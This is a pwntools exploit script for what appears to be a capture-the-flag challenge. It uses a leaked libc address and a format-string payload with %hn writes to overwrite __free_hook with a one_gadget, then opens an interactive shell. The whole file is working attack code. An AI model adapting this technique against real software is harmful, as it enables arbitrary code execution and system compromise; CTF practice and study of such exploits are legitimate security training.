#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('app_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+153
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('challenges3.ctf.sd', 33372)
else:
    p = process([exe.path])
GDB()

p.recvuntil(b'Clue: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3c5620
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

one_gadget = 0xf03a4 + libc.address
hook = libc.sym.__free_hook

package = {
    (one_gadget >> 0) & 0xffff: hook,
    (one_gadget >> 16) & 0xffff: hook+2,
    (one_gadget >> 32) & 0xffff: hook+4,
}

order = sorted(package)
load = flat(
    b'%c'*14,
    f'%{order[0] - 14}c%hn'.encode(),
    f'%{order[1] - order[0]}c%hn'.encode(),
    f'%{order[2] - order[1]}c%hn'.encode(),

)
# print(libc.sym.__free_hook)
load = load.ljust(0x40, b'A')
load += flat(
    package[order[0]],
    0,
    package[order[1]],
    0,
    package[order[2]],
)
# load = load.ljust(0x10000, b'A')
sla(b'your path:\n', load)
print(hex(one_gadget))

sla(b'again:\n', b'%100000c')

p.interactive()
